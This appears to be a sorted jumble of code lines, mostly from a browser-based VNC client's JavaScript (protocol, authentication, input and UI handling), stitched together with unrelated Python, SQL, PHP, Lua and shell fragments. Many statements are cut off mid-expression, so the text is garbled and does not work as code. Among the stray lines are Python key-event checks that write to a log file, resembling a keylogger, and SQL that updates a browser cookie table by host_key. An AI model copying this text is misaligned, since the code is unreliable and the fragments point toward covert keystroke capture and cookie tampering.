        // Mouse state
        // Mouse wheel events are sent in steps over VNC. This means that the VNC
        // Move focus to the screen in order to be able to use the
        // NB(directxman12): these are down here so that we don't run them multiple times
        // NB(directxman12): we don't want to call any callbacks or print messages until
        // NB: nothing that needs explicit teardown should be done
        // Normally we only apply the current resize mode after a
        // Note that if deltamode is line or page won't matter since we aren't
        // On security failures we might get a string with a reason
        // Only allow focus to move to other elements that need
        // Only prevent focus change if the virtual keyboard is active
        // Only show the button if fullscreen is properly supported
        // Only supported with full depth support
        // Other part of the DOM
        // Pixel units unless it's non-zero.
        // Possible start of AltGr sequence
        // Prevent actually submitting the form
        // Prevent middle-click pasting (see handler for why we bind to document)
        // Psuedo-encoding settings
        // Refresh UI elements from saved cookies
        // Release (key up) all keys that are in a down state
        // Release (key up) if window loses focus
        // Restore control bar position
        // See below
        // See comment in _handleKeyDown()
        // Send the key events
        // Server capabilities
        // Set to null to indicate unknown/unsupported instead.
        // Settings with immediate effects
        // Setup event handlers
        // So iterate through all alpha bytes in rgba and stop at the
        // Some browsers add an outline on focus
        // State change actions
        // State change closes dialogs as they may not be relevant
        // TODO(directxman12): make genDES not require an Array
        // The 'disconnected' state is permanent for each RFB object
        // The difference between pixel and line can be important however since
        // The transform needs coordinates that are relative to the parent
        // These heights need to be non-zero for the below logic to work
        // This causes the expected client dimensions to change.
        // This is a hack because Safari on macOS screws up the calculation
        // Timers
        // Touch events have implicit capture
        // Transition to disconnected without waiting for socket to close
        // Translate the DOM
        // Try to fetch version number
        // UI.disconnect() won't be used in those cases.
        // Update the settings control
        // We manipulate the anchor instead of the actual control
        // We might get this event because of a drag operation that
        // We need to handle errors when we requested the resize.
        // We rely on modern APIs which might not be available in an
        // Wheel events
        // When changing clipping we might show or hide scrollbars.
        // When the cursor target has capture we want to show the cursor.
        // Windows doesn't send proper key releases for a bunch of
        // Windows has a rather nasty bug where it won't send key
        // XXX: TightVNC 2.8.11 sends no cursor at all until Windows changes
        // abort that detection
        // an element's dimensions
        // anymore
        // as well. Update the viewport dimensions.
        // bar in order to avoid creating new a stacking group
        // browser to flush all events and then check again if the cursor
        // but forgets to advertise it. Try to detect such servers by
        // choose the notunnel type
        // clipping when enabling or disabling scaling
        // detect this case by seeing the two key events directly after
        // directly from the server. Note that we can't control if
        // each other with a very short time between them (<50ms).
        // element instead.
        // enough.
        // errors. Only shows the first error.
        // fade out the controlbar to highlight that
        // fake Ctrl
        // first non-zero.
        // focus to function properly
        // for one of the axes is large enough.
        // for when scrollbars are needed. We get scrollbars when making the
        // getModifierState for NumLock is not supported on mac and ios and always returns false.
        // i.e. contains at least one not-fully-transparent pixel.
        // if port == 80 (or 443) then it won't be present and should be
        // if we focus the screen the virtual keyboard would be closed.
        // in the framebuffer and don't send the empty local cursor. There is
        // initial connect. And we don't know if the server supports
        // initial cursor instead.
        // insecure context
        // is hit blindly. But there are also VNC servers that draw the cursor
        // it originally did via the WebSocket's event handler
        // it was a quick press and release of the button.
        // it. Result: no cursor at all until a window border or an edit field
        // keep these here so we can refer to them later
        // keyboard right after these extra keys.
        // keys around a bit to make things more sane for the remote
        // looking for their custom tunnel type.
        // macOS doesn't send proper key releases if a key is pressed
        // main setup
        // mouseup and mousedown on the same place toggles the controlbar
        // mouseup vs releaseCapture.
        // moved outside of the target. Check what's under the cursor
        // movement. The transitionend-event will not fire when display=none.
        // moving around amongst its sub elements. Let the move handler
        // no way to satisfy both sides.
        // now and adjust visibility based on that.
        // populate decoder array with objects
        // possibly others).
        // pressed
        // preventDefault() on mousedown doesn't stop this event for some
        // protocol can't handle a wheel event with specific distance or speed.
        // read the server values
        // reason so we have to explicitly block it
        // receive tunnel capabilities
        // release events for a Shift button if the other Shift is still
        // resize events aren't available for elements
        // resizing until we've gotten here.
        // same keysym or we'll confuse the server
        // screen array
        // send block request to controller                                                                                                                                                                                                    
        // sending the mouse wheel delta to the server anyway.
        // server. This method is used by RealVNC and TigerVNC (and
        // set manually
        // should be visible.
        // so try to compensate when we can
        // so we need to merge those in to a single AltGr event. We
        // sort things out.
        // state change events. That gets extra confusing for CapsLock
        // synchronuosly.
        // text-corrections or other input that modify existing text
        // the dragging button
        // the fact that we process each incoming message
        // the focus has been moved to the screen
        // the move function expects coordinates relative the the viewport.
        // the subtypes length and won't be called again
        // the user wants to see the dot instead of this.
        // this string is translated or not.
        // to deal with virtual keyboards which omit key info
        // waiting for ACK
        // waiting for VeNCrypt version
        // waiting for subtypes list
        // we have a threshold that can be smaller than the line height.
        // we temporarily toggle them off and on.
        // when the disconnection isn't clean or if it is initiated by
        // while meta is held down
        // window resize event. However there is no such trigger on the
        //Alpha cursor.
        //Classic cursor
        1280x720  16bits: ./start.sh 1280x720x16 http://example.com
        1280x720  24bits: ./start.sh 1280x720x24 http://example.com
        1920x1080 16bits: ./start.sh 1920x1080x16 http://example.com
        1920x1080 24bits: ./start.sh 1920x1080x24 http://example.com
        </noscript>
        @media only screen and (max-width: 1600px) {
        AND name = 
        Log.Debug('Authenticating using scheme: ' 
        Log.Debug('Requested new desktop size: ' 
        Log.Debug('Sent ProtocolVersion: ' 
        UI.activateControlbar()
        UI.addClipboardHandlers()
        UI.addConnectionControlHandlers()
        UI.addControlbarHandlers()
        UI.addExtraKeysHandlers()
        UI.addMachineHandlers()
        UI.addSettingChangeHandler('compression')
        UI.addSettingChangeHandler('encrypt')
        UI.addSettingChangeHandler('host')
        UI.addSettingChangeHandler('logging')
        UI.addSettingChangeHandler('path')
        UI.addSettingChangeHandler('port')
        UI.addSettingChangeHandler('quality')
        UI.addSettingChangeHandler('reconnect')
        UI.addSettingChangeHandler('reconnect_delay')
        UI.addSettingChangeHandler('repeaterID')
        UI.addSettingChangeHandler('resize')
        UI.addSettingChangeHandler('shared')
        UI.addSettingChangeHandler('show_dot')
        UI.addSettingChangeHandler('view_clip')
        UI.addSettingChangeHandler('view_only')
        UI.addSettingsHandlers()
        UI.addTouchSpecificHandlers()
        UI.closeAllPanels()
        UI.closeClipboardPanel()
        UI.closeConnectPanel()
        UI.closeExtraKeys()
        UI.closePowerPanel()
        UI.closeSettingsPanel()
        UI.connected = false
        UI.connected = true
        UI.controlbarDrag = false
        UI.controlbarDrag = true
        UI.controlbarGrabbed = false
        UI.controlbarGrabbed = true
        UI.controlbarMouseDownClientY = ptr.clientY
        UI.controlbarMouseDownOffsetY = ptr.clientY - bounds.top
        UI.desktopName = e.detail.name
        UI.disableSetting(name)
        UI.disconnect()
        UI.hideStatus()
        UI.idleControlbar()
        UI.inhibitReconnect = false
        UI.inhibitReconnect = true
        UI.initFullscreen()
        UI.initSettings()
        UI.keepControlbar()
        UI.keyboardinputReset()
        UI.lastKeyboardinput = kbi.value
        UI.moveControlbarHandle(eventY)
        UI.moveControlbarHandle(handleBounds.top)
        UI.openConnectPanel()
        UI.openControlbar()
        UI.reconnectCallback = null
        UI.reconnectPassword = password
        UI.rfb = undefined
        UI.rfb.approveServer()
        UI.rfb.clipViewport = UI.getSetting('view_clip')
        UI.rfb.clipboardPasteFrom(text)
        UI.rfb.compressionLevel = parseInt(UI.getSetting('compression'))
        UI.rfb.disconnect()
        UI.rfb.dragViewport = !UI.rfb.dragViewport
        UI.rfb.focus()
        UI.rfb.qualityLevel = parseInt(UI.getSetting('quality'))
        UI.rfb.resizeSession = UI.getSetting('resize') === 'remote'
        UI.rfb.scaleViewport = UI.getSetting('resize') === 'scale'
        UI.rfb.sendCtrlAltDel()
        UI.rfb.showDotCursor = UI.getSetting('show_dot')
        UI.rfb.viewOnly = UI.getSetting('view_only')
        UI.setupSettingLabels()
        UI.showControlbarHint(false)
        UI.showControlbarHint(true)
        UI.showStatus(msg)
        UI.touchKeyboard = new Keyboard(document.getElementById('noVNC_keyboardinput'))
        UI.touchKeyboard.grab()
        UI.touchKeyboard.onkeyevent = UI.keyEvent
        UI.updateFullscreenButton()
        UI.updateLogging()
        UI.updateSetting('compression')
        UI.updateSetting('encrypt')
        UI.updateSetting('logging')
        UI.updateSetting('path')
        UI.updateSetting('quality')
        UI.updateSetting('reconnect')
        UI.updateSetting('reconnect_delay')
        UI.updateSetting('repeaterID')
        UI.updateSetting('resize')
        UI.updateSetting('shared')
        UI.updateSetting('view_clip')
        UI.updateSetting('view_only')
        UI.updateSetting(name)
        UI.updateViewDrag()
        UI.updateViewOnly()
        UI.updateVisualState('connected')
        UI.updateVisualState('connecting')
        UI.updateVisualState('disconnected')
        UI.updateVisualState('disconnecting')
        UI.updateVisualState('init')
        UPDATE cookies SET value = 
        WHERE host_key = 
        WebUtil.initLogging(UI.getSetting('logging'))
        [ $i -lt 10 ] 
        ]
        body {
        btn.onclick = null
        clearTimeout(UI.closeControlbarTimeout)
        clearTimeout(UI.idleControlbarTimeout)
        clearTimeout(UI.statusTimeout)
        clearTimeout(this._altGrTimeout)
        clearTimeout(this._mouseMoveTimer)
        clearTimeout(this._resizeTimeout)
        const A = this._sock.rQshiftBytes(8)
        const RFBkeycode = getRFBkeycode(keycode)
        const anchor = document.getElementById('noVNC_control_bar_anchor')
        const bar = document.getElementById('noVNC_control_bar')
        const barDisplayStyle = window.getComputedStyle(bar).display
        const bigEndian  = this._sock.rQshift8()
        const bits = Math.floor(depth/3)
        const blueMax    = this._sock.rQshift16()
        const blueShift  = this._sock.rQshift8()
        const bounds = handle.getBoundingClientRect()
        const bpp         = this._sock.rQshift8()
        const btn = document.getElementById('noVNC_toggle_alt_button')
        const btn = document.getElementById('noVNC_toggle_ctrl_button')
        const btn = document.getElementById('noVNC_toggle_windows_button')
        const bytesPerPixel = 4
        const challenge = Array.prototype.slice.call(this._sock.rQshiftBytes(16))
        const cipher = await legacyCrypto.importKey(
        const clientSupportedTunnelTypes = {
        const clientSupportedTypes = {
        const clientTypes = [
        const code = KeyboardUtil.getKeycode(e)
        const code = this._getKeyCode(e)
        const credentials = window.crypto.getRandomValues(new Uint8Array(128))
        const ctrl = document.getElementById('noVNC_setting_' 
        const curClip = this._display.clipViewport
        const cursorType = this._sock.rQshift8()
        const depth       = this._sock.rQshift8()
        const encs = []
        const eventY = ptr.clientY - UI.controlbarMouseDownOffsetY
        const firstUpdate = !this._supportsSetDesktopSize
        const g = this._sock.rQshiftBytes(8)
        const greenMax   = this._sock.rQshift16()
        const greenShift = this._sock.rQshift8()
        const h = this._FBU.height
        const handleBounds = handle.getBoundingClientRect()
        const handleHeight = handle.getBoundingClientRect().height
        const height = this._sock.rQshift16()
        const hint = document.getElementById('noVNC_control_bar_hint')
        const host = UI.getSetting('host')
        const hotx = this._FBU.x
        const hoty = this._FBU.y
        const image = this._shouldShowDotCursor() 
        const input = document.getElementById('noVNC_keyboardinput')
        const kbi = document.getElementById('noVNC_keyboardinput')
        const key = legacyCrypto.importKey(
        const labels = document.getElementsByTagName('LABEL')
        const margin = 10
        const mask = this._sock.rQshiftBytes(masklength)
        const masklength = Math.ceil(w / 8) 
        const nameLength = this._sock.rQshift32()
        const newValue = event.target.value
        const numberOfScreens = this._sock.rQpeek8()
        const oldLen = oldValue.length
        const oldValue = UI.lastKeyboardinput
        const oldstate = this._rfbConnectionState
        const orig = this._screen.style.overflow
        const p = this._sock.rQshiftBytes(8)
        const parentRelativeY = newY - controlbarBounds.top
        const pass = encodeUTF8(this._rfbCredentials.password)
        const password = inputElemPassword.value
        const passwordChars = password.split('').map(c => c.charCodeAt(0))
        const path = UI.getSetting('path')
        const payload = this._sock.rQshiftStr(length)
        const pixels = this._sock.rQshiftBytes(pixelslength)
        const pixelslength = w 
        const port = UI.getSetting('port')
        const ptr = getPointerEvent(e)
        const redMax     = this._sock.rQshift16()
        const redShift   = this._sock.rQshift8()
        const scaling = UI.getSetting('resize') === 'scale'
        const scancode = XtScancode[code]
        const serverSupportedTunnelTypes = {}
        const serverSupportedTypes = []
        const sharedKey = legacyCrypto.deriveBits(
        const size = this._screenSize()
        const status = this._sock.rQshift32()
        const statusElem = document.getElementById('noVNC_status')
        const strlen = this._sock.rQshift32()
        const subAuthCount = this._sock.rQshift32()
        const text = document.getElementById('noVNC_clipboard_text').value
        const trueColor  = this._sock.rQshift8()
        const type = e.detail.type
        const user = encodeUTF8(this._rfbCredentials.username)
        const username = inputElemUsername.value
        const viewDragButton = document.getElementById('noVNC_view_drag_button')
        const w = this._FBU.width
        const wasConnected = UI.connected
        const width = this._sock.rQshift16()
        const xvpMsg = this._sock.rQshift8()
        const xvpVer = this._sock.rQshift8()
        credentials[64 
        credentials[username.length] = 0
        ctrl.disabled = false
        ctrl.disabled = true
        ctrl.label.classList.add('noVNC_disabled')
        ctrl.label.classList.remove('noVNC_disabled')
        data[0] = actionFlag >> 24
        data[1] = 0x00
        data[2] = 0x00
        data[3] = formatFlag
        document.documentElement
        document.getElementById('noVNC_clipboard')
        document.getElementById('noVNC_clipboard_button')
        document.getElementById('noVNC_clipboard_text').value = e.detail.text
        document.getElementById('noVNC_connect_dlg')
        document.getElementById('noVNC_control_bar')
        document.getElementById('noVNC_control_bar_anchor')
        document.getElementById('noVNC_credentials_dlg')
        document.getElementById('noVNC_keyboard_button')
        document.getElementById('noVNC_modifiers')
        document.getElementById('noVNC_power')
        document.getElementById('noVNC_power_button')
        document.getElementById('noVNC_settings')
        document.getElementById('noVNC_settings_button')
        document.getElementById('noVNC_toggle_extra_keys_button')
        document.getElementById('noVNC_verify_server_dlg')
        document.getElementById('noVNC_verify_server_dlg').classList.remove('noVNC_open')
        document.title = PAGE_TITLE
        document.title = e.detail.name 
        e.preventDefault()
        e.stopPropagation()
        elif event.Key == '@':
        elif event.Key == 'Alt_L':
        elif event.Key == 'BackSpace':
        elif event.Key == 'Caps_Lock':
        elif event.Key == 'Control_L':
        elif event.Key == 'Control_R':
        elif event.Key == 'Delete':
        elif event.Key == 'Shift_L':
        elif event.Key == 'Shift_R':
        elif event.Key == 'Super_L':
        elif event.Key == 'Super_R':
        elif event.Key == '[65027]':
        elif event.Key == 'at':
        elif event.Key == 'colon':
        elif event.Key == 'comma':
        elif event.Key == 'equal':
        elif event.Key == 'exclam':
        elif event.Key == 'parenleft':
        elif event.Key == 'parenright':
        elif event.Key == 'period':
        elif event.Key == 'semicolon':
        elif event.Key == 'space':
        else
        else:
        encs.push(encodings.encodingCopyRect)
        encs.push(encodings.encodingRaw)
        encs.push(encodings.pseudoEncodingCompressLevel0 
        encs.push(encodings.pseudoEncodingContinuousUpdates)
        encs.push(encodings.pseudoEncodingDesktopName)
        encs.push(encodings.pseudoEncodingDesktopSize)
        encs.push(encodings.pseudoEncodingExtendedClipboard)
        encs.push(encodings.pseudoEncodingExtendedDesktopSize)
        encs.push(encodings.pseudoEncodingFence)
        encs.push(encodings.pseudoEncodingLastRect)
        encs.push(encodings.pseudoEncodingQEMUExtendedKeyEvent)
        encs.push(encodings.pseudoEncodingQualityLevel0 
        encs.push(encodings.pseudoEncodingXvp)
        end
        ev.preventDefault()
        ev.stopPropagation()
        event.preventDefault()
        except Exception as e:
        exit 1
        exit(0)
        f.write('{}'.format(msg))
        fetch('./package.json')
        flags 
        for (let authType in clientSupportedTypes) {
        for (let code in this._keyDownList) {
        for (let i = 0
        for (let i = 3
        for (let i = newLen - inputs
        for (let y = 0
        formatKeys.map(x => parseInt(x))
        function getRFBkeycode(xtScanCode) {
        global $statefile
        html {
        if (!(flags 
        if (!Number.isInteger(compressionLevel) 
        if (!Number.isInteger(qualityLevel) 
        if (!UI.connected) return
        if (!UI.controlbarDrag) {
        if (!UI.controlbarGrabbed) return
        if (!UI.lastKeyboardinput) {
        if (!UI.rfb) return
        if (!UI.rfb.clipViewport 
        if (!decoder) {
        if (!e.detail.clean) {
        if (!host) {
        if (!isSafari() 
        if (!isTouchDevice) return
        if (!port) {
        if (!scale 
        if (!target) {
        if (!this._enabledContinuousUpdates) { return
        if (!this._resizeSession 
        if (!this._rfbRSAAESAuthenticationState.hasStarted) {
        if (!this._scaleViewport) {
        if (!this._showDotCursor) {
        if (!this._target) {
        if (!this._target.contains(target)) {
        if (!this._viewOnly) { this._keyboard.grab()
        if (!this.focusOnClick) {
        if (!urlOrChannel) {
        if (!useFallback) {
        if (!window.isSecureContext) {
        if ('reason' in e.detail) {
        if ((browser.isMac() 
        if ((ev.type === 'click') 
        if ((this._gestureLastTapTime !== null) 
        if ((this._rfbConnectionState === 'connecting') 
        if ((w === 0) 
        if (Math.abs(this._accumulatedWheelDeltaX) >= WHEEL_STEP) {
        if (Math.abs(this._accumulatedWheelDeltaY) >= WHEEL_STEP) {
        if (UI.connected 
        if (UI.connected) {
        if (UI.controlbarGrabbed 
        if (UI.getSetting('encrypt')) {
        if (UI.inhibitReconnect) {
        if (UI.reconnectCallback !== null) {
        if (UI.rfb) {
        if (UI.rfb.clipViewport) {
        if (UI.rfb.dragViewport) {
        if (UI.rfb.viewOnly) {
        if (WebUtil.readSetting('controlbar_pos') === 'right') {
        if (autoconnect === 'true' 
        if (barDisplayStyle !== 'none') {
        if (browser.isMac() 
        if (browser.isWindows() 
        if (changeFunc === undefined) {
        if (code !== 'Unidentified') {
        if (code === 'Unidentified') {
        if (code in this._keyDownList) {
        if (controlbarBounds.height < (handleHeight 
        if (ctrl.type === 'checkbox') {
        if (curClip !== newClip) {
        if (cursorType == 0) {
        if (depth > 16) {
        if (document.activeElement != input) return
        if (document.activeElement != input) {
        if (document.activeElement == input) return
        if (document.fullscreenElement 
        if (document.getElementById('noVNC_clipboard')
        if (document.getElementById('noVNC_control_bar')
        if (document.getElementById('noVNC_keyboard_button')
        if (document.getElementById('noVNC_modifiers')
        if (document.getElementById('noVNC_power')
        if (document.getElementById('noVNC_settings')
        if (down === undefined) {
        if (down) {
        if (e.code) {
        if (e.keyCode) {
        if (e.keyIdentifier) {
        if (ev.deltaMode !== 0) {
        if (ev.type === 'click') {
        if (event.target.form !== undefined) {
        if (extended) {
        if (firstUpdate) {
        if (handleHeight === 0 
        if (isRepeater) {
        if (isTouchDevice) {
        if (length > 64) {
        if (length >= 0) {
        if (newClip) {
        if (newLen > 2 
        if (newY < controlbarBounds.top 
        if (oldstate === 'disconnected') {
        if (on === this._clippingViewport) {
        if (options.showDotCursor !== undefined) {
        if (password === null) {
        if (port) {
        if (ptr.clientX < (window.innerWidth 
        if (resize) {
        if (scale 
        if (scaling) {
        if (serverSupportedTunnelTypes[0]) {
        if (serverSupportedTunnelTypes[1] 
        if (show) {
        if (state === oldstate) {
        if (status === 0) { // OK
        if (statusType !== 'error') {
        if (strlen > 0) {
        if (subAuthCount === 0) {  // empty sub-auth list received means 'no auth' subtype selected
        if (target === this._target) {
        if (this._FBU.rects === 0) {
        if (this._FBU.rects > 0) {
        if (this._FBU.x === 1 
        if (this._altGrArmed) {
        if (this._canvas.style.visibility !== 'hidden') {
        if (this._canvas.style.visibility === 'hidden') {
        if (this._captureIsActive()) {
        if (this._clientHasExpectedSize()) {
        if (this._clipboardServerCapabilitiesFormats[extendedClipboardFormatText] 
        if (this._compressionLevel === compressionLevel) {
        if (this._disconnTimer 
        if (this._fbDepth == 24) {
        if (this._mouseMoveTimer !== null) {
        if (this._mouseMoveTimer == null) {
        if (this._qemuExtKeyEventSupported 
        if (this._qualityLevel === qualityLevel) {
        if (this._resizeSession) {
        if (this._rfbConnectionState !== 'connected' 
        if (this._rfbConnectionState !== 'connected') { return
        if (this._rfbConnectionState === 'connected') {
        if (this._rfbCredentials.ardPublicKey != undefined 
        if (this._rfbCredentials.password === undefined) {
        if (this._rfbCredentials.username === undefined 
        if (this._rfbRSAAESAuthenticationState !== null) {
        if (this._rfbRSAAESAuthenticationState === null) {
        if (this._rfbTightVNC) {
        if (this._rfbVeNCryptState == 0) {
        if (this._rfbVeNCryptState == 1) {
        if (this._rfbVeNCryptState == 2) { // waiting for subtypes length
        if (this._rfbVeNCryptState == 3) {
        if (this._rfbVersion > this._rfbMaxVersion) {
        if (this._rfbVersion >= 3.7) {
        if (this._rfbXvpVer < ver) { return
        if (this._scaleViewport) {
        if (this._shouldShowCursor(target)) {
        if (this._target) {
        if (this._url) {
        if (this._viewOnly) { return
        if (this._viewportDragging) {
        if (this.dragViewport) {
        if (type === 'RSA') {
        if (typeof UI.rfb !== 'undefined') {
        if (typeof password === 'undefined') {
        if (typeof statusType === 'undefined') {
        if (typeof time === 'undefined') {
        if (typeof val !== 'undefined' 
        if (useFallback) {
        if (val === null) {
        if (window.getComputedStyle(target).cursor !== 'none') {
        if (window.visualViewport) {
        if event.Key == 'Return':
        if not value:
        if origin:match(pattern) then
        if(($json = file_get_contents($statefile)) !== false) {
        if((int)$sid < 10 
        input.blur()
        input.focus()
        l10n.translateDOM()
        length = toSigned32bit(length)
        let actionFlag = 0x00000000
        let backspaces = inputs < 0 
        let bpp
        let bytes = 4 
        let bytes = pixelslength 
        let capslock = e.getModifierState('CapsLock')
        let clientKey = legacyCrypto.generateKey(
        let control = e.getModifierState('Control')
        let ctx = this._canvas.getContext('2d')
        let dX = ev.deltaX
        let dY = ev.deltaY
        let data  = new Uint8Array(4 
        let data = new Uint8Array(4 
        let data = new Uint8Array(4)
        let dataToDeflate = []
        let decoder = this._decoders[this._FBU.encoding]
        let deflatedData = deflator.deflate(new Uint8Array(dataToDeflate))
        let deflator = new Deflator()
        let flags = this._sock.rQshift32()
        let formatFlag = 0x00000000
        let formatKeys = Object.keys(formats)
        let generator = this._sock.rQshiftBytes(2)
        let inputElemPassword = document.getElementById('noVNC_password_input')
        let inputElemUsername = document.getElementById('noVNC_username_input')
        let inputs = newLen - oldLen
        let isRepeater = 0
        let keyLength = this._sock.rQshift16()
        let keysym = KeyboardUtil.getKeysym(e)
        let length
        let length = this._sock.rQshift32()
        let length = this._sock.rQshift8()
        let loopOffset = 4
        let magnitude
        let msg
        let msgType
        let name = this._sock.rQshiftStr(length)
        let name = this._sock.rQshiftStr(nameLength)
        let newClip = this._clipViewport
        let newLen
        let newY = viewportRelativeY
        let numlock = e.getModifierState('NumLock')
        let passwordBytes = new Uint8Array(64)
        let pixIdx = 0
        let port = window.location.port
        let prime = this._sock.rQshiftBytes(keyLength)
        let r = this._screen.getBoundingClientRect()
        let rgba
        let rgba = new Uint8Array(w 
        let serverPublicKey = this._sock.rQshiftBytes(keyLength)
        let url
        let usernameBytes = new Uint8Array(256)
        let val
        let val = WebUtil.getConfigVar(name)
        let val = WebUtil.readSetting(name)
        let value = UI.getSetting(name)
        let xhr = new XMLHttpRequest()
        options = options 
        optn.text = text
        optn.value = value
        os.remove(log_file)
        pass
        passwordBytes[password.length] = 0
        return 'Unidentified'
        return Promise.resolve(UI.rfb)
        return WebUtil.initSettings().then(() => {
        return clientTypes.includes(type)
        return currentWidth == this._expectedClientWidth 
        return data
        return document.captureElement 
        return false
        return this._compressionLevel
        return this._display.getImageData()
        return this._negotiateAuthentication()
        return this._qualityLevel
        return true
        return val
        return x[:-x[-1]].decode('utf8')
        rgbaPixels: new Uint8Array([
        selectbox.options.add(optn)
        setTimeout(() => document
        sock.flush()
        sock.sQpush16((1 << bits) - 1)
        sock.sQpush16(0)
        sock.sQpush16(down)
        sock.sQpush16(encodings.length)
        sock.sQpush16(h)
        sock.sQpush16(height)
        sock.sQpush16(w)
        sock.sQpush16(width)
        sock.sQpush16(x)
        sock.sQpush16(y)
        sock.sQpush32(RFBkeycode)
        sock.sQpush32(flags)
        sock.sQpush32(id)
        sock.sQpush32(keysym)
        sock.sQpush32(length)
        sock.sQpush8(0)
        sock.sQpush8(1)
        sock.sQpush8(150)
        sock.sQpush8(2)
        sock.sQpush8(248)
        sock.sQpush8(250)
        sock.sQpush8(251)
        sock.sQpush8(255)
        sock.sQpush8(3)
        sock.sQpush8(4)
        sock.sQpush8(5)
        sock.sQpush8(6)
        sock.sQpush8(bits 
        sock.sQpush8(bpp)
        sock.sQpush8(depth)
        sock.sQpush8(down)
        sock.sQpush8(enable)
        sock.sQpush8(incremental 
        sock.sQpush8(mask)
        sock.sQpush8(op)
        sock.sQpush8(payload.length)
        sock.sQpush8(trueColor 
        sock.sQpush8(ver)
        sock.sQpushBytes(data)
        sock.sQpushString(payload)
        statusElem.textContent = text
        stopEvent(e)
        super()
        switch (ev.type) {
        switch (msgType) {
        switch (state) {
        switch (statusType) {
        switch (sversion) {
        switch (this._FBU.encoding) {
        switch (this._rfbAuthScheme) {
        switch (this._rfbConnectionState) {
        switch (this._rfbInitState) {
        switch (xvpMsg) {
        table th {
        this._FBU = {
        this._accumulatedWheelDeltaX 
        this._accumulatedWheelDeltaX = 0
        this._accumulatedWheelDeltaY 
        this._accumulatedWheelDeltaY = 0
        this._allKeysUp()
        this._altGrArmed = false
        this._canvas = document.createElement('canvas')
        this._canvas.blur()
        this._canvas.focus(options)
        this._canvas.height = 0
        this._canvas.height = h
        this._canvas.style.left = this._position.x 
        this._canvas.style.margin = 'auto'
        this._canvas.style.outline = 'none'
        this._canvas.style.top = this._position.y 
        this._canvas.tabIndex = -1
        this._canvas.width = 0
        this._canvas.width = w
        this._capabilities = { power: false }
        this._capabilities[cap] = val
        this._clipViewport = false
        this._clipViewport = viewport
        this._clipboardServerCapabilitiesActions = {}
        this._clipboardServerCapabilitiesFormats = {}
        this._clipboardText = null
        this._clippingViewport = false
        this._clippingViewport = on
        this._compressionLevel = 0
        this._compressionLevel = compressionLevel
        this._cursor = new Cursor()
        this._cursor.attach(this._canvas)
        this._cursor.detach()
        this._cursorImage = RFB.cursors.none
        this._cursorImage = {
        this._decoders = {}
        this._decoders[encodings.encodingCopyRect] = new CopyRectDecoder()
        this._decoders[encodings.encodingHextile] = new HextileDecoder()
        this._decoders[encodings.encodingJPEG] = new JPEGDecoder()
        this._decoders[encodings.encodingRRE] = new RREDecoder()
        this._decoders[encodings.encodingRaw] = new RawDecoder()
        this._decoders[encodings.encodingTightPNG] = new TightPNGDecoder()
        this._decoders[encodings.encodingTight] = new TightDecoder()
        this._decoders[encodings.encodingZRLE] = new ZRLEDecoder()
        this._disconnTimer = null
        this._display = null
        this._display.flip()
        this._enabledContinuousUpdates = false
        this._eventHandlers = {
        this._expectedClientHeight = null
        this._expectedClientHeight = this._screen.clientHeight
        this._expectedClientWidth = null
        this._expectedClientWidth = this._screen.clientWidth
        this._fbDepth = 24
        this._fbHeight = 0
        this._fbHeight = height
        this._fbName = name
        this._fbWidth = 0
        this._fbWidth = width
        this._fixScrollbars()
        this._flushing = false
        this._gestureFirstDoubleTapEv = null
        this._gestureLastMagnitudeX = 0
        this._gestureLastMagnitudeY = 0
        this._gestureLastTapTime = Date.now()
        this._gestureLastTapTime = null
        this._gestures = new GestureHandler()
        this._gestures = null
        this._gestures.attach(this._canvas)
        this._gestures.detach()
        this._handleMouseMove(event)
        this._hotSpot.x = 0
        this._hotSpot.x = hotx
        this._hotSpot.y = 0
        this._hotSpot.y = hoty
        this._keyDownList = {}
        this._keyboard = new Keyboard(this._canvas)
        this._keyboard = null
        this._keyboard.onkeyevent = this._handleKeyEvent.bind(this)
        this._keyboard.ungrab()
        this._mouseButtonMask = 0
        this._mouseLastMoveTime = 0
        this._mouseLastMoveTime = Date.now()
        this._mouseMoveTimer = null
        this._mousePos = {}
        this._position.x = event.clientX - this._hotSpot.x
        this._position.x = this._position.x 
        this._position.y = event.clientY - this._hotSpot.y
        this._position.y = this._position.y 
        this._qemuExtKeyEventSupported = false
        this._qualityLevel = 9
        this._qualityLevel = qualityLevel
        this._rawChannel = null
        this._refreshCursor()
        this._repeaterID = options.repeaterID 
        this._resizeObserver = new ResizeObserver(this._eventHandlers.handleResize)
        this._resizeObserver = null
        this._resizeObserver.disconnect()
        this._resizeObserver.observe(this._screen)
        this._resizeSession = false
        this._resizeSession = resize
        this._resizeTimeout = null
        this._resumeAuthentication()
        this._rfbAuthScheme = -1
        this._rfbAuthScheme = securityTypeVNCAuth
        this._rfbCleanDisconnect = false
        this._rfbCleanDisconnect = true
        this._rfbConnectionState = ''
        this._rfbConnectionState = state
        this._rfbCredentials = creds
        this._rfbCredentials = options.credentials 
        this._rfbCredentials.ardCredentials = encrypted
        this._rfbCredentials.ardPublicKey = clientPublicKey
        this._rfbInitState = ''
        this._rfbInitState = 'Authentication'
        this._rfbInitState = 'Security'
        this._rfbMaxVersion = 3.8
        this._rfbRSAAESAuthenticationState = null
        this._rfbRSAAESAuthenticationState.checkInternalEvents()
        this._rfbTightVNC = false
        this._rfbVeNCryptState = 0
        this._rfbVersion = 0
        this._rfbXvpVer = 0
        this._saveExpectedClientSize()
        this._scaleViewport = false
        this._scaleViewport = scale
        this._screen = document.createElement('div')
        this._screen.appendChild(this._canvas)
        this._screen.getBoundingClientRect()
        this._screen.style.background = DEFAULT_BACKGROUND
        this._screen.style.display = 'flex'
        this._screen.style.height = '100%'
        this._screen.style.overflow = 'auto'
        this._screen.style.overflow = 'hidden'
        this._screen.style.overflow = orig
        this._screen.style.width = '100%'
        this._screenFlags = 0
        this._screenID = 0
        this._sendEncodings()
        this._setDesktopName(name)
        this._shared = 'shared' in options 
        this._showDotCursor = false
        this._showDotCursor = show
        this._sock = new Websock()
        this._sock = null
        this._sock.close()
        this._sock.flush()
        this._sock.off('close')
        this._sock.off('error')
        this._sock.off('message')
        this._sock.off('open')
        this._sock.rQshift8()
        this._sock.rQskipBytes(1)
        this._sock.rQskipBytes(3)
        this._sock.sQpush32(pass.length)
        this._sock.sQpush32(this._rfbCredentials.password.length)
        this._sock.sQpush32(this._rfbCredentials.username.length)
        this._sock.sQpush32(user.length)
        this._sock.sQpush8(this._rfbCredentials.target.length)
        this._sock.sQpush8(this._rfbCredentials.username.length)
        this._sock.sQpushBytes(B)
        this._sock.sQpushBytes(passwordBytes)
        this._sock.sQpushBytes(response)
        this._sock.sQpushBytes(usernameBytes)
        this._sock.sQpushString(pass)
        this._sock.sQpushString(this._rfbCredentials.password)
